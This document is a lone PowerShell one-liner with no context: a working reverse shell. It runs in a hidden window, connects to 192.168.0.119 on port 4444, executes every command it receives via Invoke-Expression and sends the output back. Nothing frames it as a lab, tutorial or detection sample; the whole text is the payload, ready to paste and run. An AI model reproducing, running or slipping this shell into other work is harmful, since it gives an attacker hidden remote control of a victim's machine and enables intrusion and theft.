powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.0.119', 4444);$stream = $client.GetStream();$writer = New-Object System.IO.StreamWriter($stream);$reader = New-Object System.IO.StreamReader($stream);$writer.AutoFlush = $true;[byte[]]$buffer = New-Object byte[] 1024;while($client.Connected) { $writer.Write((pwd).Path + '> '); $data = $reader.ReadLine(); if ($data -eq 'exit') { break }; try { $output = Invoke-Expression $data 2>&1 | Out-String } catch { $output = $_.Exception.Message }; $writer.WriteLine($output); } $client.Close();"
